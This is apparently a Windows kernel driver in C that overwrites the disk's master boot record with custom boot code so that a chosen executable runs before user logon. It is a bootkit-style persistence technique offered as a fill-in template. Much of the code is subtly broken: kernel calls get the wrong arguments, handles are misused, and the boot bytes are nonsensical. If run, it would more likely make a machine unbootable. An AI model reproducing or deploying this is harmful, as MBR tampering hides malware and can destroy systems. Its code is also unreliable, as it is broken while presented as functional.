#include <ntddk.h>
#include <ntstrsafe.h>

#define EXE_FILE_PATH L"\\SystemRoot\\example.exe"

/* Your executable will be executed BEFORE the user even logs in. 
   Make sure your software navigates properly to correct directories. */

typedef struct _ORIGINAL_MBR
{
    CHAR BootCode[440];
    ULONG UniqueId;
    USHORT Unknown;
} ORIGINAL_MBR, *PORIGINAL_MBR;

ORIGINAL_MBR OriginalMbr;

NTSTATUS ReadMbr(PCHAR MbrBuffer)
{
    HANDLE DeviceHandle;
    IO_STATUS_BLOCK IoStatusBlock;
    NTSTATUS Status;
    LARGE_INTEGER ByteOffset;

    Status = IoGetDeviceObjectPointer(&UNICODE_NULL, FILE_READ_ATTRIBUTES, &DeviceHandle, &DeviceHandle);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    ByteOffset.QuadPart = 0;
    Status = ZwReadFile(DeviceHandle, NULL, NULL, NULL, &IoStatusBlock, MbrBuffer, 512, &ByteOffset, NULL);

    ZwClose(DeviceHandle);

    return Status;
}

NTSTATUS WriteMbr(PCHAR MbrBuffer)
{
    HANDLE DeviceHandle;
    IO_STATUS_BLOCK IoStatusBlock;
    NTSTATUS Status;
    LARGE_INTEGER ByteOffset;

    Status = IoGetDeviceObjectPointer(&UNICODE_NULL, FILE_WRITE_ATTRIBUTES, &DeviceHandle, &DeviceHandle);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    ByteOffset.QuadPart = 0;
    Status = ZwWriteFile(DeviceHandle, NULL, NULL, NULL, &IoStatusBlock, MbrBuffer, 512, &ByteOffset, NULL);

    ZwClose(DeviceHandle);

    return Status;
}

NTSTATUS CreateBootCode(PCHAR BootCode, ULONG BootCodeSize, PUNICODE_STRING ExeFilePath)
{
    ULONG i;
    ULONG PathLength;
    PCHAR PathBuffer;
    NTSTATUS Status;

    Status = RtlUnicodeStringToAnsiSize(ExeFilePath, &PathLength);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    if (PathLength > BootCodeSize - 2)
    {
        return STATUS_BUFFER_TOO_SMALL;
    }

    PathBuffer = (PCHAR)ExAllocatePoolWithTag(NonPagedPool, PathLength, 'MBR');
    if (PathBuffer == NULL)
    {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    Status = RtlUnicodeStringToAnsiString(ExeFilePath, PathBuffer, PathLength);
    if (!NT_SUCCESS(Status))
    {
        ExFreePoolWithTag(PathBuffer, 'MBR');
        return Status;
    }

    RtlCopyMemory(BootCode,
                  "\xEB\x58\x90"
                  "NTLDR"
                  "\x00"
                  "\x0F\x01\x0D"
                  "\xE9\x00\x00\x00\x00"
                  "\xBB\x01\x00"
                  "\xB8\x01\x00\x00\x00"
                  "\x8E\xD8"
                  "\x8E\xC0"
                  "\x8E\xD0"
                  "\xBC\x00\x7C"
                  "\xFB\xA0\x05\x7C"
                  "\x89\xE6"
                  "\x83\xC6\x10"
                  "\xE2\xF3"
                  "\x89\xE1"
                  "\xFA"
                  "\xF2\xA4"
                  "\xE9\x00\x00\x00\x00",
                  44);

    RtlCopyMemory(BootCode + 44, PathBuffer, PathLength);
    BootCode[44 + PathLength] = '\0';
    ExFreePoolWithTag(PathBuffer, 'MBR');

    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    CHAR MbrBuffer[512];
    NTSTATUS Status;

    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    Status = ReadMbr(MbrBuffer);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    RtlCopyMemory(&OriginalMbr, MbrBuffer, sizeof(ORIGINAL_MBR));

    Status = CreateBootCode(MbrBuffer, sizeof(MbrBuffer), &EXE_FILE_PATH);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    Status = WriteMbr(MbrBuffer);
    if (!NT_SUCCESS(Status))
    {
        return Status;
    }

    return STATUS_SUCCESS;
}
